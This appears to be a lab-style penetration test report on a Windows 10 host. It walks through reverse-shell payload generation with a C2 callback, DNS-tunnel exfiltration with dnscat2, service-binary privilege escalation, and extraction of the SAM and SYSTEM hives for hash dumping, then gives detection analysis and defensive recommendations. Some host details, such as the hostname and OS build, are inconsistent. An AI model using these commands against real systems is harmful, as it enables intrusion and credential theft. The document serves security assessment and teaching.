\# Penetration Test Report: Acme Corp Internal Network

\*\*Date:\*\* October 05, 2026  
\*\*Tester:\*\* Lillian Griffiths  
\*\*Target Host:\*\* DESKTOP-64LA (Windows 10 Pro)  
\*\*Objective:\*\* Validate internal lateral movement and privilege escalation controls.

\#\# 1\. Executive Summary

The assessment identified a critical misconfiguration in the local security policy that allowed for local privilege escalation from standard user to SYSTEM. Additionally, unencrypted data staging practices were observed. These findings indicate a need for stricter application control policies and encryption requirements for temporary files.

\#\# 2\. Methodology

\#\#\# Phase 1: Initial Access  
\*\*Vector:\*\* Compromised User Credentials  
\*\*Premise:\*\* A darknet database of compromised credentials including the champuser credentials for the target system. The target system has port 3389 open and listening for RDP connections.

\*\*Commands Used:\*\*  
\`\`\`bash  
\# Payload Generation  
msfvenom \-p windows/x64/meterpreter/reverse\_https LHOST=10.0.17.24 LPORT=12000 \-f exe \> rat.exe

\# Listener Setup  
use exploit/multi/handler  
set payload windows/x64/meterpreter/reverse\_https  
set LHOST 10.0.17.24  
set LPORT 12000  
exploit  
\`\`\`

\*\*Session Output Analysis:\*\*  
Initial access to the system was established via an RDP connection, from which the RAT payload was downloaded and executed. Upon execution, the following Meterpreter session was established from 10.0.17.32 (Windows 10\) to 10.0.17.24 (Kali C2). the \`getuid\` command was used to identify that the compromised account is champuser.  
![][image1]

\*   \*\*ID:\*\* 1  
\*   \*\*Type:\*\* \`meterpreter\` indicates full-featured agent connection.  
\*   \*\*User:\*\* \`DESKTOP-64LA2VE\\champuser\` confirms initial foothold as standard user.

\#\#\# Phase 2: Enumeration  
\*\*Modules Executed:\*\*

| Module | Command | Key Findings |  
| :--- | :--- | :--- |  
| sysinfo | \`sysinfo\` | Windows 10 Pro, Build 17763, x64 |  
| getprivs | \`getprivs\` | User is not in Administrators group |  
| hashdump | \`hashdump\` | Failed (requires SYSTEM) |  
| enumdesktops | \`enumdesktops\` | Identified interactive and non-interactive desktops accessible to current user |  
| ps| \`ps\` | Lists all running processes. Some such as lsass.exe is running as SYSTEM, which presents a good target to migrate to later. |  
![][image2]  
![][image3]  
![][image4]  
![][image5]

\*\*Custom Script:\*\*  
Deployed \`enum.bat\` to gather a large amount of enumeration data about the local machine and network. Output files are stored in C:\\temp.

\*\*Staging:\*\*  
Data compressed using \`execute \-f powershell \-a "Compress-Archive \-Path 'C:\\temp' \-DestinationPath 'C:\\temp\\archive.zip'"\`.  
![][image7]

\#\#\# Phase 3: Exfiltration  
\*\*Method:\*\* DNS tunneling via dnscat2\`  
\*\*Justification:\*\* DNS traffic is essential for basic network operations, so firewalls will generally always allow it. There are often high amounts of traffic as well, as DNS is such a commonly used protocol, that tunneling will blend in easily.  
![][image8]  
![][image9]

\*\*Detection Risk:\*\*  
High volume of DNS requests from a single system may trigger IDS signatures for tunneling tools.

\*\*Verification on C2:\*\*  
\`\`\`  
\$ execute \-f powershell \-a “.\\dnscat2-v0.07-client-win32.exe –dns server=10.0.17.24,port=53”  
\[+\] Session established  
\$ session \-i 1  
\$ download C:/temp/archive.zip  
\$ unzip archive.zip  
\$ cat temp/arp.txt  
![][image10]  
\`\`\`

\#\#\# Phase 4: Privilege Escalation  
\*\*Vulnerability:\*\* PowerUp vulnerability scanner was used to locate a number of vulnerabilities, including a service with a writable path.  
\*\*Root Cause:\*\* The service allows standard users to write the directory is stored in, allowing the legitimate binary to be replaced with a malicious one.  
\*\*Exploit Mechanism:\*\* Using the windows/local/service\_permissions module in Metasploit, the binary was replaced with a RAT, which was run as SYSTEM when the service started.![][image11]

\*\*Verification:\*\*  
\`\`\`bash  
meterpreter \> getuid  
Server username: NT AUTHORITY\\SYSTEM  
\`\`\`

\*\*C2 Verification (vssadmin):\*\*  
\`\`\`bash  
meterpreter \> shell  
Microsoft Windows \[Version 10.0.19045.3803\]  
C:\\Windows\\system32\>vssadmin list shadows  
shadowset {a1b2c3d4-...} created at: 2023-10-12T14:30:00.1234567Z  
\`\`\`  
![][image12]

\#\#\# Shadow Copy Exfiltration  
The shadow copy path must first be symlinked to a path that is downloadable with Meterpreter. Then, using the download command in the Meterpreter shell, the shadow copy can be exfiltrated to the C2 server.  
\`\`\`  
mklink /d C:\\shadow \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\

download C:\\shadow\\Windows\\System32\\config\\SAM C:\\Users\\Public\\SAM  
download C:\\shadow\\Windows\\System32\\config\\SYSTEM C:\\Users\\Public\\SYSTEM  
\`\`\`  
![][image13]

Once on the C2 server, the hashes can be dumped with \`impacket-secretsdump \-sam SAM \-system SYSTEM LOCAL\`  
![][image14]

\#\#\# Phase 5: Log Analysis  
\*\*Sysmon Event ID 1 Findings:\*\*

\*\*NOTE: Copy and paste your Sysmon logs into Claude and have it format it like the table below.\*\*

| Timestamp | Process | Parent | Command Line |  
| :--- | :--- | :--- | :--- |  
| 04:24:28 | \`userinit.exe\` | \`winlogon.exe\` | \`C:\\Windows\\system32\\userinit.exe\` |  
| 04:30:32 | \`rat.exe\` | \`explorer.exe\` | \`C:\\champuser\\Downloads\\rat.exe\` |   
| 04:30:40 | \`powershell.exe\` | \`rat.exe\` | \`powershell.exe \-EncodedCommand JgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAf0AOg \-InputFormat None\` |   
| 05:36:32 | \`WMIC.exe\` | \`cmd.exe\` | \`wmic shadowcopy call create Volume=”C:\\”\` |  
| 04:55:18 | \`dnscat2-v0.07-client-win32.exe\` | \`explorer.exe\` | \`C:\\Users\\champuser\\Downloads\\dnscat2-v0.07-client-win32\\dnscat2-v0.07-client-win32.exe\` |  
\*\*Analysis:\*\*    
The initial RDP connection spawned \`userinit.exe\` from \`winlogon.exe\`. \`userinit.exe\` then spawns \`explorer.exe\` This on its own does not specifically indicate compromise, just that a user has logged on. However, \`rat.exe\` was spawned from \`explorer.exe\`, which is a strong indicator of compromise. \`rat.exe\` then spawned \`Powershell.exe\`. The PowerShell command was encoded, which may be detected by Sigma rules, as there are dedicated rules that catch any powershell commands that are encoded with \-EncodedCommand.

When \`WMIC.exe\` was spawned by \`cmd.exe\` with the command to make a shadow copy of the C:\\ drive, this would likely be flagged immediately, as it is an indicator that an attacker is exfiltrating the volume to extract password hashes.

Additionally, when \`explorer.exe\` spawned the dnscat2 process and was logged, this would likely trigger an alert if good logging rules are set up, as dnscat is a known tool used for data exfiltration.  
\#\# 3\. Recommendations

1\.  Restrict RDP access to systems. If RDP is not necessary for legitimate users, port 3389 should be closed. As compromised credentials lead to this breach, I also recommend that password change policies be implemented to reduce the impact of credential leaks.  
2\.  Enable PowerShell Script Block Logging to capture encoded commands.  
3\.  Ensure proper access controls are in place for service executable paths, so they cannot be replaced with malicious binaries.
